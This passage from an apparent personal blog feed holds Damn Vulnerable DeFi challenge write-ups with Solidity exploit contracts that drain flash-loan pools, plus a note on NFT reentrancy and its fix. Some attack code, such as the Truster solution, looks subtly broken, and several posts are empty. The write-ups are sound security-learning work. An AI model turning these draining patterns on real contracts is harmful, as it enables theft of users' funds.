class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;./SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = SideEntranceLenderPool(_pool);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        payable(owner).transfer(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) external payable &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        uint256 value = msg.value;</span><br><span class="line">        // deposit</span><br><span class="line">        pool.deposit&#123;value: value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOwner() public view returns (address) &#123;</span><br><span class="line">        return owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Attack.t.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/forge-std/src/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/4-side-entrance/Attacker.sol&quot;;</span><br><span class="line">import &quot;../../src/4-side-entrance/SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SideTest is Test &#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line">    Exp exp;</span><br><span class="line">    address attacker;</span><br><span class="line">    uint256 internal constant INITIAL_Value = 1000e18;</span><br><span class="line">    uint256 internal constant INITIAL_HACKER_BALANCE = 1e18;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        pool = new SideEntranceLenderPool();</span><br><span class="line">        vm.deal(address(pool), INITIAL_Value);</span><br><span class="line">        vm.deal(attacker, INITIAL_HACKER_BALANCE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testValue() public &#123;</span><br><span class="line">        console.log(&quot;pool balance: &quot;, address(pool).balance);</span><br><span class="line">        console.log(&quot;attacker balance: &quot;, address(attacker).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testOwner() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        exp = new Exp(address(pool));</span><br><span class="line">        address owner = exp.getOwner();</span><br><span class="line">        assertEq(address(owner), address(attacker));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttacke() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        exp = new Exp(address(pool));</span><br><span class="line">        exp.attack(1000e18);</span><br><span class="line">        exp.withdraw();</span><br><span class="line">        assertEq(address(pool).balance, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/ray-so-export.png"></p>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
            <tag> DamnVulnerableDefi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-3</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-3/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-3/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</span><br><span class="line"></span><br><span class="line">The pool holds 1 million DVT tokens. You have nothing.</span><br><span class="line"></span><br><span class="line">To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TrusterLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract TrusterLenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    DamnValuableToken public immutable token;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    constructor(DamnValuableToken _token) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external nonReentrant returns (bool) &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        token.transfer(borrower, amount);</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        if (token.balanceOf(address(this)) &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><ul><li>similiar to FlashLoan,but not from IERC3156FlashLender ,instead its use target and calldata to call the callback function.</li><li>so we can see there is a functioncall in <code>flashLoan()</code> , which means we can excute  repay</li></ul><p>![[Pasted image 20231228103125.png]]</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../lib/forge-std/src/Test.sol&quot;;import &quot;../../src/3-truster/TrusterLenderPool.sol&quot;;import &quot;../../src/DamnValuableToken.sol&quot;;contract TmpAttacker &#123;    uint256 internal constant INITIAL_BALANCE = 100000e18;    address player;    address pool;    DamnValuableToken token;    constructor(address _player, address _pool, address _token) &#123;        player = _player;        pool = _pool;        token = DamnValuableToken(_token);    &#125;    function withdraw() external &#123;        token.transferFrom(pool, player, INITIAL_BALANCE);    &#125;&#125;contract Trustertest is Test &#123;    uint256 internal constant INITIAL_BALANCE = 100000e18;    function setUp(address _pool, address _token) public &#123;        TmpAttacker attacker = new TmpAttacker(msg.sender, _token, _pool);        TrusterLenderPool pool = TrusterLenderPool(_pool);        bytes memory data = abi.encodeWithSignature(            &quot;approve(address,uint256)&quot;,            attacker,            INITIAL_BALANCE        );        pool.flashLoan(0, address(attacker), _token, data);        attacker.withdraw();    &#125;    function testattack() public &#123;&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RTTA-1:AttackNFT</title>
      <link href="/2023/12/28/RTTA-1-AttackNFT/"/>
      <url>/2023/12/28/RTTA-1-AttackNFT/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>ERC721<br>ER155</p><h1 id="Common-Issues"><a href="#Common-Issues" class="headerlink" title="Common Issues"></a>Common Issues</h1><hr><h2 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h2><p>普通的重入攻击，攻击者通过合约漏洞循环调用合约，将合约中的资产转走或者铸造大量代币。转账NFT的时候不会触发合约的fallback或者receive函数，那为什么有重入风险。</p><p>因为在NFT标准中ERC721&#x2F;ERC1155,为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 <code>ERC721</code> 的 <code>safeTransferFrom()</code> 函数会调用目标地址的 <code>onERC721Received()</code> 函数，而黑客可以把恶意代码嵌入其中进行攻击。</p><p>危险函数</p><table><thead><tr><th>–</th><th>Function</th><th>External Function</th></tr></thead><tbody><tr><td>ERC721</td><td>safeTransferFrom</td><td>onERC721Received</td></tr><tr><td>ERC721</td><td><code>_safeMint</code></td><td>onERC721Received</td></tr><tr><td>ERC1155</td><td>safeTransferFrom</td><td>onERC1155Received</td></tr><tr><td>ERC1155</td><td><code>_safeBatchTransferFrom</code></td><td>onERC1155Received</td></tr><tr><td>ERC1155</td><td><code>_mint</code></td><td>onERC1155Received</td></tr></tbody></table><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><ol><li>检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。我们可以用这个模式修复有漏洞的<code>mint()</code>函数:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function mint() payable external &#123;</span><br><span class="line">// 检查是否mint过</span><br><span class="line">require(mintedAddress[msg.sender] == false);</span><br><span class="line">// 增加total supply</span><br><span class="line">totalSupply++;</span><br><span class="line">// 记录mint过的地址</span><br><span class="line">mintedAddress[msg.sender] = true;</span><br><span class="line">// mint</span><br><span class="line">_safeMint(msg.sender, totalSupply);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Logic-issues特权用户抢跑"><a href="#Logic-issues特权用户抢跑" class="headerlink" title="Logic issues特权用户抢跑"></a>Logic issues特权用户抢跑</h2><h2 id="NFT-Market-Issues"><a href="#NFT-Market-Issues" class="headerlink" title="NFT Market Issues"></a>NFT Market Issues</h2><ul><li><strong>Signature verification</strong></li></ul><h2 id="Audit-Example"><a href="#Audit-Example" class="headerlink" title="Audit Example"></a>Audit Example</h2><hr><p><a href="https://0xvolodya.hashnode.dev/nft-attacks">https://0xvolodya.hashnode.dev/nft-attacks</a></p><h2 id="Audit-Guidelines"><a href="#Audit-Guidelines" class="headerlink" title="Audit Guidelines"></a>Audit Guidelines</h2><p><a href="https://blog.quillaudits.com/2023/03/07/nft-marketplace-smart-contract-audit-guidelines/">https://blog.quillaudits.com/2023/03/07/nft-marketplace-smart-contract-audit-guidelines/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Solidity </tag>
            
            <tag> NFT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About FuzzingTest</title>
      <link href="/2023/12/28/About-FuzzingTest/"/>
      <url>/2023/12/28/About-FuzzingTest/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blockchain </tag>
            
            <tag> Foundry </tag>
            
            <tag> FuzzTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-2</title>
      <link href="/2023/12/28/DamnVulnerableDeFi-2/"/>
      <url>/2023/12/28/DamnVulnerableDeFi-2/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.</span><br><span class="line"></span><br><span class="line">A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.</span><br><span class="line"></span><br><span class="line">Take all ETH out of the user’s contract. If possible, in a single transaction.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p><code>NaiveReceiverLenderPool.sol</code>：<br>The contract is a lending pool that allows flash loans with a fixed fee of 1 ether . which means we need to repay our debt plus 1 ether after doing a flash loan.</p><p>Our Goal is to make the users account &#x3D;&gt; 0 ether , so maybe i will try to do ten times flashloan , which can make users account to 0 ether . </p><p>FlashLoan() takes four parameters,:</p><ul><li>receiver</li><li>token</li><li>amount</li><li>data</li></ul><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-1</title>
      <link href="/2023/12/28/DamnVulnerableDeFi-1/"/>
      <url>/2023/12/28/DamnVulnerableDeFi-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h1><hr><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Challenge #1 - Unstoppable</span><br><span class="line"></span><br><span class="line">There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.</span><br><span class="line"></span><br><span class="line">To pass the challenge, make the vault stop offering flash loans.</span><br><span class="line"></span><br><span class="line">You start with 10 DVT tokens in balance.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p><code>UnstoppableLender.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20&#125; from &quot;@openzeppelin-contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &#123;ReentrancyGuard&#125; from &quot;@openzeppelin-contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title DamnValuableToken</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract UnstoppableLender is ReentrancyGuard &#123;</span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    error MustDepositOneTokenMinimum();</span><br><span class="line">    error TokenAddressCannotBeZero();</span><br><span class="line">    error MustBorrowOneTokenMinimum();</span><br><span class="line">    error NotEnoughTokensInPool();</span><br><span class="line">    error FlashLoanHasNotBeenPaidBack();</span><br><span class="line">    error AssertionViolated();</span><br><span class="line"></span><br><span class="line">    constructor(address tokenAddress) &#123;</span><br><span class="line">        if (tokenAddress == address(0)) revert TokenAddressCannotBeZero();</span><br><span class="line">        damnValuableToken = IERC20(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function depositTokens(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        if (amount == 0) revert MustDepositOneTokenMinimum();</span><br><span class="line">        // Transfer token from sender. Sender must have first approved them.</span><br><span class="line">        damnValuableToken.transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        poolBalance = poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line">        if (borrowAmount == 0) revert MustBorrowOneTokenMinimum();</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        if (balanceBefore &lt; borrowAmount) revert NotEnoughTokensInPool();</span><br><span class="line"></span><br><span class="line">        // Ensured by the protocol via the `depositTokens` function</span><br><span class="line">        if (poolBalance != balanceBefore) revert AssertionViolated();</span><br><span class="line"></span><br><span class="line">        damnValuableToken.transfer(msg.sender, borrowAmount);</span><br><span class="line"></span><br><span class="line">        IReceiver(msg.sender).receiveTokens(</span><br><span class="line">            address(damnValuableToken),</span><br><span class="line">            borrowAmount</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        if (balanceAfter &lt; balanceBefore) revert FlashLoanHasNotBeenPaidBack();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function receiveTokens(address tokenAddress, uint256 amount) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ReceiverUnstoppable.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &#123;UnstoppableLender&#125; from &quot;./UnstoppableLender.sol&quot;;</span><br><span class="line">import &#123;IERC20&#125; from &quot;@openzeppelin-contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &#123;SafeERC20&#125; from &quot;@openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ReceiverUnstoppable</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract ReceiverUnstoppable &#123;</span><br><span class="line">    using SafeERC20 for IERC20;</span><br><span class="line"></span><br><span class="line">    UnstoppableLender private immutable pool;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    error OnlyOwnerCanExecuteFlashLoan();</span><br><span class="line">    error SenderMustBePool();</span><br><span class="line"></span><br><span class="line">    constructor(address poolAddress) &#123;</span><br><span class="line">        pool = UnstoppableLender(poolAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev Pool will call this function during the flash loan</span><br><span class="line">    function receiveTokens(address tokenAddress, uint256 amount) external &#123;</span><br><span class="line">        if (msg.sender != address(pool)) revert SenderMustBePool();</span><br><span class="line">        IERC20(tokenAddress).safeTransfer(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeFlashLoan(uint256 amount) external &#123;</span><br><span class="line">        if (msg.sender != owner) revert OnlyOwnerCanExecuteFlashLoan();</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><ul><li>The contract use &gt;0.8.0 which means there is no underflow&#x2F;overflow question</li><li>The contract inherit from Openzepplien’s ReentrancyGuard contract, so we can be sure that reentrancy will not be a problem.</li><li>The <code>constructor</code> is correctly checking that the DVT token is not an empty address</li><li>Our goal is to make the flash loan can;t be support again</li></ul><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p><code>flashloan()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(IERC3156FlashBorrower receiver,address _token,uint256 amount,</span><br><span class="line">bytes calldata data) external returns (bool) &#123;</span><br><span class="line">        if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">        uint256 balanceBefore = totalAssets();</span><br><span class="line">        if (convertToShares(totalSupply) != balanceBefore)</span><br><span class="line">            revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line">        uint256 fee = flashFee(_token, amount);</span><br><span class="line">        // transfer tokens out + execute callback on receiver</span><br><span class="line">        ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line">        // callback must return magic value, otherwise assume it failed</span><br><span class="line">        if (</span><br><span class="line">            receiver.onFlashLoan(</span><br><span class="line">                msg.sender,</span><br><span class="line">                address(asset),</span><br><span class="line">                amount,</span><br><span class="line">                fee,</span><br><span class="line">                data</span><br><span class="line">            ) != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)</span><br><span class="line">        ) revert CallbackFailed();</span><br><span class="line">        // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">        ERC20(_token).safeTransferFrom(</span><br><span class="line">            address(receiver),</span><br><span class="line">            address(this),</span><br><span class="line">            amount + fee</span><br><span class="line">        );</span><br><span class="line">        ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><hr><p><a href="https://stermi.xyz/blog/damn-vulnerable-defi-challenge-1-solution-unstoppable">https://stermi.xyz/blog/damn-vulnerable-defi-challenge-1-solution-unstoppable</a><br><a href="https://zach030.xlog.app/damn-vulnerable-defi--Unstoppable">https://zach030.xlog.app/damn-vulnerable-defi--Unstoppable</a><br><a href="https://github.com/WTFAcademy/WTF-Solidity/blob/main/51_ERC4626/readme.md">https://github.com/WTFAcademy/WTF-Solidity/blob/main/51_ERC4626/readme.md</a></p>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
            <tag> FlashLoan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Defi-StableCoin</title>
      <link href="/2023/12/28/Defi-StableCoin/"/>
      <url>/2023/12/28/Defi-StableCoin/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/12/26/hello-world/"/>
      <url>/2023/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a 